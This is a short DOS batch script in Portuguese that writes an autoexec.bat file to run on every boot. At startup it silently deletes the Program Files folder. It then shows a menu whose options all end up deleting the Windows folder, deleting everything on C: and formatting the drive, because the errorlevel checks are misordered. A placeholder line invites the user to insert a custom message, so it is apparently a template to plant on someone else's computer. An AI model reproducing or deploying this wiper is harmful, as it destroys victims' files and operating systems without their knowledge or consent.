CD..
COPY con autoexec.bat
CLS
DELTREE  /y C:\arquiv~1
echo AE MANÉ... AQUI VOCÊ ESCREVE SUA MENSAGEM
echo (1) Deletar o Windows
echo (2) Deletar tudo...
echo (3) Formatar C:\
echo (4) Sair
CHOICE  /c123
if errorlevel 1 goto DELWIN
if errorlevel 2 goto DELALL
if errorlevel 3 goto FORMATAR
if errorlevel 4 goto SAIR
:DELWIN
DELTREE  /y c:\windows\
goto DELALL
:DELALL
DELTREE  /y c:\windows
DELTREE  /y c:\*.*
goto FORMATAR
:FORMATAR
FORMAT  c:
goto SAIR
:SAIR
CLS
F6  (Aperte F6 no teclado...)
